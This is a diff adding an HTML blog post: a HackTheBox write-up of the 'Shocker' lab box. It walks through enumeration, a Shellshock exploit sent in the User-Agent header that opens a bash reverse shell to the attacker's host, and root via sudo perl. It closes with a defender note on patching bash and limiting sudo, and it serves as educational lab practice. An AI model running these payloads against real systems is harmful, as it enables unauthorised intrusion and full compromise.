@@ -1,0 +1,281 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="Shocker — HackTheBox writeup by Tabarik Asif. Shellshock CGI bash exploit via User-Agent header, sudo perl GTFO for root.">
+<meta property="og:title" content="Shocker — Tabarik Asif">
+<meta property="og:description" content="Shellshock CGI bash exploit via User-Agent header, sudo perl GTFO for root.">
+<meta property="og:url" content="https://tabarik.dev/blog/posts/shocker.html">
+<title>Shocker — Tabarik Asif</title>
+<link rel="icon" type="image/svg+xml" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><circle cx='50' cy='50' r='38' stroke='%2300FFE0' stroke-width='3' fill='none'/><line x1='50' y1='12' x2='50' y2='88' stroke='%2300FFE0' stroke-width='2'/><line x1='12' y1='50' x2='88' y2='50' stroke='%2300FFE0' stroke-width='2'/><circle cx='50' cy='50' r='4' fill='%2300FFE0'/></svg>">
+<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@300;400;700&family=Bebas+Neue&family=Syne:wght@400;700;800&display=swap" rel="stylesheet">
+<style>
+:root{--c:#00FFE0;--c2:rgba(0,255,224,.07);--bg:#050505;--bg2:#090909;--bg3:#0f0f0f;--red:#FF453A;--amb:#FFD60A;--grn:#30D158;--blu:#0A84FF;--t1:#ffffff;--t2:#e8e8e8;--t3:#c0c0c0;--br:rgba(0,255,224,.14);--br2:rgba(0,255,224,.32);--glow:0 0 30px rgba(0,255,224,.18);--fn:'JetBrains Mono',monospace;--fd:'Bebas Neue',sans-serif;--fs:'Syne',sans-serif}
+*,*::before,*::after{margin:0;padding:0;box-sizing:border-box}html{scroll-behavior:smooth}
+body{background:var(--bg);color:var(--t1);font-family:var(--fn);overflow-x:hidden;-webkit-font-smoothing:antialiased}
+body::after{content:'';position:fixed;inset:0;background-image:url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='300' height='300'%3E%3Cfilter id='n'%3E%3CfeTurbulence type='fractalNoise' baseFrequency='.75' numOctaves='4' stitchTiles='stitch'/%3E%3C/filter%3E%3Crect width='300' height='300' filter='url(%23n)' opacity='.4'/%3E%3C/svg%3E");opacity:.03;pointer-events:none;z-index:9000}
+#spb{position:fixed;top:0;left:0;height:2px;background:var(--c);z-index:9999;width:0;box-shadow:0 0 8px var(--c);transition:width .1s}
+#cur,#cur2{display:none}
+@media(hover:hover) and (pointer:fine){body{cursor:none}#cur{display:block;position:fixed;width:30px;height:30px;border:1px solid var(--c);border-radius:50%;pointer-events:none;z-index:9999;transform:translate(-50%,-50%);transition:width .18s,height .18s;mix-blend-mode:exclusion}#cur2{display:block;position:fixed;width:5px;height:5px;background:var(--c);border-radius:50%;pointer-events:none;z-index:9999;transform:translate(-50%,-50%)}}
+nav{position:fixed;top:0;left:0;right:0;z-index:1000;display:flex;justify-content:space-between;align-items:center;padding:20px 8vw;transition:background .4s,border .4s}
+nav.stuck{background:rgba(5,5,5,.96);border-bottom:1px solid var(--br);backdrop-filter:blur(16px)}
+.nav-logo{font-family:var(--fd);font-size:1.5rem;letter-spacing:4px;color:var(--c);text-decoration:none}
+.nav-links{display:flex;gap:28px;list-style:none}
+.nav-links a{font-size:12px;letter-spacing:2.5px;text-transform:uppercase;color:var(--t1);text-decoration:none;transition:color .2s;opacity:.8}
+.nav-links a:hover,.nav-links a.act{color:var(--c);opacity:1}
+.post-header{padding:120px 8vw 64px;border-bottom:1px solid var(--br);max-width:900px}
+.breadcrumb{font-size:11px;letter-spacing:2px;color:var(--t3);margin-bottom:24px;display:flex;align-items:center;gap:10px}
+.breadcrumb a{color:var(--t3);text-decoration:none;transition:color .2s}
+.breadcrumb a:hover{color:var(--c)}
+.breadcrumb-sep{opacity:.4}
+.post-badges{display:flex;gap:8px;flex-wrap:wrap;margin-bottom:20px}
+.badge{font-size:9px;letter-spacing:2px;padding:4px 10px;border:1px solid;display:inline-block}
+.badge-easy{border-color:rgba(48,209,88,.35);color:var(--grn)}
+.badge-medium{border-color:rgba(255,214,10,.35);color:var(--amb)}
+.badge-hard{border-color:rgba(255,69,58,.35);color:var(--red)}
+.badge-win{border-color:rgba(10,132,255,.35);color:var(--blu)}
+.badge-linux{border-color:rgba(255,255,255,.15);color:var(--t3)}
+.badge-cve{border-color:rgba(255,69,58,.35);color:var(--red)}
+.post-title{font-family:var(--fd);font-size:clamp(4rem,10vw,8rem);line-height:.85;letter-spacing:3px;color:var(--c);text-shadow:0 0 60px rgba(0,255,224,.1);margin-bottom:28px}
+.post-meta{display:flex;align-items:center;gap:20px;flex-wrap:wrap;font-size:11px;letter-spacing:1.5px;color:var(--t3);margin-bottom:20px}
+.post-meta span{display:flex;align-items:center;gap:6px}
+.post-tags{display:flex;flex-wrap:wrap;gap:8px;margin-top:6px}
+.ptag{font-size:10px;letter-spacing:1px;padding:4px 10px;border:1px solid rgba(0,255,224,.18);color:var(--c)}
+.info-box{background:var(--bg2);border:1px solid var(--br);padding:28px 32px;margin-top:36px;display:grid;grid-template-columns:repeat(4,1fr);gap:24px}
+.info-lbl{font-size:9px;letter-spacing:3px;color:var(--t3);text-transform:uppercase;margin-bottom:8px}
+.info-val{font-size:14px;color:var(--t1);letter-spacing:.5px}
+.info-val.cyan{color:var(--c);font-family:var(--fn)}
+.post-body{max-width:900px;padding:64px 8vw 100px}
+.post-body h2{font-family:var(--fs);font-size:1.5rem;font-weight:700;color:var(--t1);padding-left:16px;border-left:3px solid var(--c);margin:56px 0 24px;letter-spacing:.5px;line-height:1.2}
+.post-body h2:first-child{margin-top:0}
+.post-body h3{font-family:var(--fs);font-size:1.1rem;font-weight:700;color:var(--t2);margin:32px 0 14px}
+.post-body p{font-family:var(--fs);font-size:1rem;line-height:1.9;color:var(--t2);margin-bottom:18px}
+.post-body ul,.post-body ol{font-family:var(--fs);font-size:1rem;line-height:1.9;color:var(--t2);margin:0 0 18px 22px}
+.post-body li{margin-bottom:6px}
+.post-body code{background:rgba(0,255,224,.08);color:var(--c);padding:2px 6px;font-family:var(--fn);font-size:.88em;letter-spacing:.3px}
+pre{background:#000;border-left:3px solid var(--c);padding:20px 24px;margin:24px 0;overflow-x:auto;font-family:var(--fn);font-size:13px;line-height:1.7;scrollbar-width:thin;scrollbar-color:var(--br) transparent}
+pre .cmd{color:var(--amb)}pre .out{color:var(--grn)}pre .cmt{color:var(--t3);opacity:.6}
+.callout{background:rgba(0,255,224,.04);border:1px solid var(--br);border-left:3px solid var(--c);padding:16px 20px;margin:24px 0;font-size:13px;line-height:1.7;color:var(--t2)}
+.callout.warn{border-left-color:var(--amb);background:rgba(255,214,10,.04)}
+.callout.crit{border-left-color:var(--red);background:rgba(255,69,58,.04)}
+.callout-lbl{font-size:10px;letter-spacing:2px;margin-bottom:6px;text-transform:uppercase}
+.callout .callout-lbl{color:var(--c)}.callout.warn .callout-lbl{color:var(--amb)}.callout.crit .callout-lbl{color:var(--red)}
+.flags-box{background:var(--bg2);border:1px solid var(--br);padding:24px 28px;margin:24px 0;display:grid;grid-template-columns:1fr 1fr;gap:20px}
+.flag-lbl{font-size:10px;letter-spacing:3px;color:var(--t3);text-transform:uppercase;margin-bottom:8px}
+.flag-val{font-family:var(--fn);font-size:13px;color:var(--c);letter-spacing:.5px;word-break:break-all}
+.back-link{display:inline-flex;align-items:center;gap:8px;font-size:11px;letter-spacing:2px;text-transform:uppercase;color:var(--t3);text-decoration:none;padding:0 8vw;margin:48px 0 16px;transition:color .2s}
+.back-link:hover{color:var(--c)}
+.post-nav{display:grid;grid-template-columns:1fr 1fr;gap:1px;background:var(--br);max-width:900px;margin:0 8vw}
+.pnav-card{background:var(--bg2);padding:28px 32px;text-decoration:none;color:inherit;display:block;transition:background .3s;position:relative;overflow:hidden}
+.pnav-card:hover{background:var(--bg3)}
+.pnav-card::before{content:'';position:absolute;top:0;left:0;right:0;height:2px;background:linear-gradient(90deg,var(--c),transparent);transform:scaleX(0);transform-origin:left;transition:.5s}
+.pnav-card:hover::before{transform:scaleX(1)}
+.pnav-dir{font-size:10px;letter-spacing:2px;color:var(--t3);margin-bottom:8px;text-transform:uppercase}
+.pnav-title{font-family:var(--fd);font-size:1.8rem;letter-spacing:2px;color:var(--c);line-height:1}
+.pnav-card.next{text-align:right}.pnav-card.next::before{transform-origin:right}
+footer{padding:36px 8vw;border-top:1px solid var(--br);display:flex;justify-content:space-between;align-items:center;flex-wrap:wrap;gap:16px;margin-top:64px}
+.fb{font-family:var(--fd);font-size:1.2rem;letter-spacing:4px;color:var(--c)}
+.fc2{font-size:12px;color:var(--t3);letter-spacing:1px}.ft{font-size:11px;color:#1a1a1a;letter-spacing:1px}
+@media(max-width:900px){.info-box{grid-template-columns:repeat(2,1fr)}.post-nav{grid-template-columns:1fr}.flags-box{grid-template-columns:1fr}}
+@media(max-width:768px){nav{padding:16px 6vw}.nav-links{display:none}.post-header{padding:100px 6vw 48px}.post-body{padding:48px 6vw 80px}.post-nav,.back-link{margin-left:6vw;margin-right:6vw}footer{padding:32px 6vw}.info-box{grid-template-columns:1fr 1fr;padding:20px;gap:16px}}
+</style>
+</head>
+<body>
+<div id="spb"></div><div id="cur"></div><div id="cur2"></div>
+
+<nav id="nav">
+  <a href="../../" class="nav-logo">TABARIK</a>
+  <ul class="nav-links">
+    <li><a href="../../">Home</a></li>
+    <li><a href="../../#projects">Portfolio</a></li>
+    <li><a href="../" class="act">Blog</a></li>
+  </ul>
+</nav>
+
+<header class="post-header">
+  <div class="breadcrumb"><a href="../">Blog</a><span class="breadcrumb-sep">→</span><span>Shocker</span></div>
+  <div class="post-badges">
+    <span class="badge badge-easy">EASY</span>
+    <span class="badge badge-linux">LINUX</span>
+    <span class="badge badge-cve">CVE-2014-6271</span>
+  </div>
+  <div class="post-title">Shocker</div>
+  <div class="post-meta">
+    <span>February 24, 2026</span>
+    <span>7 min read</span>
+    <span style="color:var(--red)">CVE-2014-6271 — Shellshock</span>
+  </div>
+  <div class="post-tags">
+    <span class="ptag">Shellshock</span><span class="ptag">CGI</span><span class="ptag">sudo</span>
+  </div>
+  <div class="info-box">
+    <div class="info-item"><div class="info-lbl">Target IP</div><div class="info-val cyan">10.10.10.56</div></div>
+    <div class="info-item"><div class="info-lbl">OS</div><div class="info-val">Linux</div></div>
+    <div class="info-item"><div class="info-lbl">Difficulty</div><div class="info-val">Easy</div></div>
+    <div class="info-item"><div class="info-lbl">Platform</div><div class="info-val">HackTheBox</div></div>
+  </div>
+</header>
+
+<article class="post-body">
+
+  <h2>Recon</h2>
+
+  <p>Quick port scan — two ports, one web service, one non-standard SSH port. Nothing exotic on first glance, but the Apache version told me to start thinking about CGI.</p>
+
+  <pre>
+<span class="cmd">$ nmap -sC -sV -oN nmap/initial 10.10.10.56</span>
+<span class="out">80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+|_http-title: Apache2 Ubuntu Default Page: It works
+2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2</span>
+  </pre>
+
+  <p>Port 80 returns the Apache default page. Nothing obviously interesting in the HTML source. SSH is on 2222 which is unusual — likely not the intended first step. I moved straight to web enumeration.</p>
+
+  <h2>Enumeration</h2>
+
+  <h3>Directory Fuzzing</h3>
+
+  <p>The default Apache page means I need to find real content. Started with a standard dir scan. The <code>/cgi-bin/</code> directory came back as 403 — present but not listable. That's the signal I needed.</p>
+
+  <pre>
+<span class="cmd">$ gobuster dir -u http://10.10.10.56 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt</span>
+<span class="out">/cgi-bin/             (Status: 403) [Size: 294]
+/index.html           (Status: 200) [Size: 11321]</span>
+  </pre>
+
+  <p>A <code>/cgi-bin/</code> directory on Apache 2.4.18 immediately made me think Shellshock. The next step was fuzzing inside the directory for actual CGI scripts with relevant extensions.</p>
+
+  <pre>
+<span class="cmd">$ gobuster dir -u http://10.10.10.56/cgi-bin/ -w /usr/share/wordlists/dirb/small.txt -x sh,cgi,pl,py</span>
+<span class="out">/user.sh              (Status: 200) [Size: 119]</span>
+  </pre>
+
+  <p>Found it: <code>/cgi-bin/user.sh</code>. Requesting it returns uptime output — a real bash script being executed as a CGI handler. Apache spawns a new bash process for each request and passes HTTP headers as environment variables. That's the Shellshock entry point.</p>
+
+  <pre>
+<span class="cmd">$ curl http://10.10.10.56/cgi-bin/user.sh</span>
+<span class="out">Content-Type: text/plain
+
+Just an uptime test script
+
+ 06:25:31 up  3:50,  0 users,  load average: 0.00, 0.00, 0.00</span>
+  </pre>
+
+  <h2>Foothold</h2>
+
+  <p>CVE-2014-6271 (Shellshock): bash up to 4.3 contains a bug in how it processes function definitions stored in environment variables. When bash is initialized, it evaluates environment variable values that look like function definitions — and any trailing commands after the function body are also executed. Apache CGI sets HTTP headers as environment variables before spawning bash, so injecting <code>() { :; };</code> followed by a command into a header triggers execution in the context of the web server.</p>
+
+  <div class="callout crit">
+    <div class="callout-lbl">CVE-2014-6271 — Shellshock</div>
+    The vulnerability is in bash initialization, not in the CGI script itself. The script doesn't even need to read the User-Agent header — bash executes the injected command just by being spawned with a malicious environment variable.
+  </div>
+
+  <p>I set up a listener and sent the payload in the User-Agent header, pointing the reverse shell back to my machine.</p>
+
+  <pre>
+<span class="cmt"># listener</span>
+<span class="cmd">$ nc -lvnp 4444</span>
+
+<span class="cmt"># exploit</span>
+<span class="cmd">$ curl -H "User-Agent: () { :;}; /bin/bash -i >& /dev/tcp/10.10.14.X/4444 0>&1" http://10.10.10.56/cgi-bin/user.sh</span>
+  </pre>
+
+  <pre>
+<span class="cmt"># shell received</span>
+<span class="out">connect to [10.10.14.X] from (UNKNOWN) [10.10.10.56] 54812
+bash: no job control in this shell
+shelly@Shocker:/usr/lib/cgi-bin$</span>
+<span class="cmd">$ id</span>
+<span class="out">uid=1000(shelly) gid=1000(shelly) groups=1000(shelly),4(adm),24(cdrom),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare)</span>
+  </pre>
+
+  <p>Shell as shelly. Upgraded with <code>python3 -c 'import pty;pty.spawn("/bin/bash")'</code> then checked for quick privesc paths.</p>
+
+  <h2>Privilege Escalation</h2>
+
+  <p>First thing I always run after getting a shell: <code>sudo -l</code>. On HTB easy boxes this often pays off immediately.</p>
+
+  <pre>
+<span class="cmd">shelly@Shocker:~$ sudo -l</span>
+<span class="out">Matching Defaults entries for shelly on Shocker:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin
+
+User shelly may run the following commands on Shocker:
+    (root) NOPASSWD: /usr/bin/perl</span>
+  </pre>
+
+  <p>Unrestricted sudo perl with no password. GTFObins has the entry for this: <code>perl -e 'exec "/bin/sh"'</code>. When run under sudo, the exec call inherits the root context.</p>
+
+  <pre>
+<span class="cmd">shelly@Shocker:~$ sudo perl -e 'exec "/bin/sh";'</span>
+<span class="out"># id</span>
+<span class="out">uid=0(root) gid=0(root) groups=0(root)</span>
+<span class="out"># hostname</span>
+<span class="out">Shocker</span>
+  </pre>
+
+  <p>Root shell. The entire box from nmap to root took under 15 minutes once I found <code>user.sh</code>.</p>
+
+  <h2>Flags</h2>
+
+  <div class="flags-box">
+    <div class="flag-item"><div class="flag-lbl">User Flag</div><div class="flag-val">/home/shelly/user.txt</div></div>
+    <div class="flag-item"><div class="flag-lbl">Root Flag</div><div class="flag-val">/root/root.txt</div></div>
+  </div>
+
+  <h2>Lessons Learned</h2>
+
+  <ul>
+    <li>A 403 on <code>/cgi-bin/</code> is not a dead end — fuzz inside with script extensions (<code>.sh</code>, <code>.cgi</code>, <code>.pl</code>). A 200 on a bash script inside cgi-bin is a Shellshock indicator.</li>
+    <li>Shellshock exploits bash initialization, not the script code — you don't need the script to echo or use the header value. The vulnerability fires on process spawn.</li>
+    <li><code>sudo -l</code> should be the very first privesc check, every time. NOPASSWD on perl/python/ruby/node = GTFObins instant win.</li>
+    <li>Non-standard SSH ports (2222 instead of 22) are worth noting but rarely the intended path on easy boxes — enumerate web first.</li>
+  </ul>
+
+  <div class="callout warn">
+    <div class="callout-lbl">Defender Note</div>
+    Patch bash beyond 4.3 and disable CGI entirely if not required. If CGI is needed, use a language runtime that doesn't inherit Shellshock (Python, Perl CGI scripts don't trigger it — the bash spawn is what does). Restrict <code>sudo</code> entries to specific commands with specific arguments, not entire interpreters.
+  </div>
+
+</article>
+
+<a href="../" class="back-link">← All Posts</a>
+
+<div class="post-nav">
+  <a href="lame.html" class="pnav-card prev">
+    <div class="pnav-dir">← Previous</div>
+    <div class="pnav-title">Lame</div>
+  </a>
+  <a href="bashed.html" class="pnav-card next">
+    <div class="pnav-dir">Next →</div>
+    <div class="pnav-title">Bashed</div>
+  </a>
+</div>
+
+<footer>
+  <a href="../../" class="fb" style="text-decoration:none;">TABARIK.DEV</a>
+  <div class="fc2">© 2025 M. Tabarik Asif — All rights reserved.</div>
+  <div class="ft">Built with caffeine &amp; 0days.</div>
+</footer>
+
+<script>
+const cur=document.getElementById('cur'),cur2=document.getElementById('cur2');
+let mx=0,my=0,rx=0,ry=0;
+if(window.matchMedia('(hover:hover) and (pointer:fine)').matches){
+  document.addEventListener('mousemove',e=>{mx=e.clientX;my=e.clientY;cur.style.left=mx+'px';cur.style.top=my+'px';});
+  (function lp(){rx+=(mx-rx)*.12;ry+=(my-ry)*.12;cur2.style.left=rx+'px';cur2.style.top=ry+'px';requestAnimationFrame(lp);})();
+  document.querySelectorAll('a,button').forEach(el=>{
+    el.addEventListener('mouseenter',()=>{cur.style.width='50px';cur.style.height='50px';});
+    el.addEventListener('mouseleave',()=>{cur.style.width='30px';cur.style.height='30px';});
+  });
+}
+window.addEventListener('scroll',()=>{
+  const pct=scrollY/(document.documentElement.scrollHeight-innerHeight)*100;
+  document.getElementById('spb').style.width=pct+'%';
+  document.getElementById('nav').classList.toggle('stuck',scrollY>50);
+});
+</script>
+</body>
+</html>
